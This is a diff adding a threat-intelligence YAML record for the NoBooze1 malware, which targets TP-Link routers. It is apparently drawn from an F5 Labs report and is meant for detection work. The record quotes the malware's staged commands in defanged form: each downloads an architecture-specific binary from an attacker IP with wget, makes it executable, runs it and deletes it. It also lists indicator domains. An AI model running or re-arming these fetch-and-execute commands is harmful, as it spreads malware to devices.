@@ -1,0 +1,52 @@
+description: "NoBooze1 malware is a staged Bash script that downloads architecture\u2011\
+  specific binaries to /tmp, executes them, and deletes the executables."
+attribution: Single threat actor (unknown)
+malware_families: NoBooze1
+TTPs:
+  processes: []
+  commandline:
+  - cd /tmp; wget hxxp://220.158.232.99/j/mle1; chmod 777 mle1; ./mle1 tplink; rm
+    mle1
+  - cd /tmp; wget hxxp://220.158.232.99/j/mbe1; chmod 777 mbe1; ./mbe1 tplink; rm
+    mbe1
+  - cd /tmp; wget hxxp://220.158.232.99/j/aale1; chmod 777 aale1; ./aale1 tplink;
+    rm aale1
+  - cd /tmp; wget hxxp://220.158.232.99/j/a5le1; chmod 777 a5le1;./a5le1 tplink; rm
+    a5le1
+  - cd /tmp; wget hxxp://220.158.232.99/j/a7le1; chmod 777 a7le1; ./a7le1 tplink;
+    rm a7le1
+  - cd /tmp; wget hxxp://220.158.232.99/j/xle1; chmod 777 xle1; ./xle1 tplink; rm
+    xle1
+  - cd /tmp; wget hxxp://220.158.232.99/j/xale1; chmod 777 xale1; ./xale1 tplink;
+    rm xale1
+  powershell: []
+  scripting_engine:
+  - "bash script (Listing\_1)"
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: wget
+    destination: 220.158.232.99
+    port: 80
+  file_activity:
+  - /tmp/mle1
+  - /tmp/mbe1
+  - /tmp/aale1
+  - /tmp/a5le1
+  - /tmp/a7le1
+  - /tmp/xle1
+  - /tmp/xale1
+  persistence: []
+  process_relations: []
+IOCs:
+- 220.158.232.99
+- cross-compiling[.]org
+- i-kiss-boys[.]com
+- furry-femboys[.]top
+- twinkfinder[.]nl
+- 3gipcam[.]com
+authors:
+- Merlyn Albery-Speyer
+reference: https://www.f5.com/labs/articles/threat-intelligence/nobooze1-malware-targets-tp-link-routers-via-cve-2019-9082
+date_of_publication: July 15, 2025
+file_creation_date: August 26, 2025
